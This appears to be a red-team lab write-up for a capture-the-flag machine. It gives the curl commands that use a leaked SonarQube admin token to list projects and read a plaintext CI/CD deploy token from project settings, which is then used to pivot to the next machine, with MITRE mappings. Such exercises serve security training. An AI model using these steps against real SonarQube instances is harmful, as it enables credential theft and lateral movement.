# solve_red.md — M4 · dev-sonar
## Red Team Solution Writeup
**Machine:** M4 — PUL Code Intelligence Portal
**Vulnerability:** Plaintext CI/CD Deploy Token in SonarQube Project Settings API
**MITRE:** T1552.002 (Credentials in Registry / Configuration)

---
## Objective
Using the SonarQube admin token from M3 (`sqa_pul_admin_2024_gridfall`), authenticate to the Code Intelligence Portal API. Query project settings for `pul-firmware-ota` and extract the Deploy Commander API token stored in plaintext under `sonar.ci.deploy_token`.

---
## Step-by-Step

### Step 1 — Verify Token Against API
```bash
curl -s http://11.x.x.x:9200/api/authentication/validate \
     -H "X-Sonar-Token: sqa_pul_admin_2024_gridfall"
# {"valid":true}
```
<img width="785" height="252" alt="image" src="https://github.com/user-attachments/assets/613769e7-cf6d-40e2-b481-69628f63eed3" />



### Step 2 — List Projects
```bash
curl -s http://11.x.x.x:9200/api/projects/search \
     -H "Authorization: Bearer sqa_pul_admin_2024_gridfall" | python3 -m json.tool
```
Note project key: `pul-firmware-ota`

<img width="1066" height="1027" alt="image" src="https://github.com/user-attachments/assets/be5f2972-cddb-441b-b6e6-e54872b7e35f" />

<img width="805" height="989" alt="image" src="https://github.com/user-attachments/assets/b68edcda-e08d-407c-a40c-9c215c69840e" />


### Step 3 — Extract CI/CD Settings (THE VULNERABILITY)
```bash
curl -s "http://11.x.x.x:9200/api/settings/values?component=pul-firmware-ota" \
     -H "Authorization: Bearer sqa_pul_admin_2024_gridfall" | python3 -m json.tool
```


Response includes:
```json
{"key": "sonar.ci.deploy_token", "value": "dc-pul-deploy-2024-gridfall"}
{"key": "sonar.ci.deploy_url",   "value": "http://11.x.x.x:8888"}
```

<img width="1118" height="962" alt="image" src="https://github.com/user-attachments/assets/65acf4fb-0004-4ab7-92ab-e7ac67a8b190" />


**Pivot:** `dc-pul-deploy-2024-gridfall` → M5 Deploy Commander (`11.x.x.x:8888`)

---
## MITRE Mapping
| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Credentials in Registry | T1552.002 |
| Discovery | Software Discovery | T1518 |
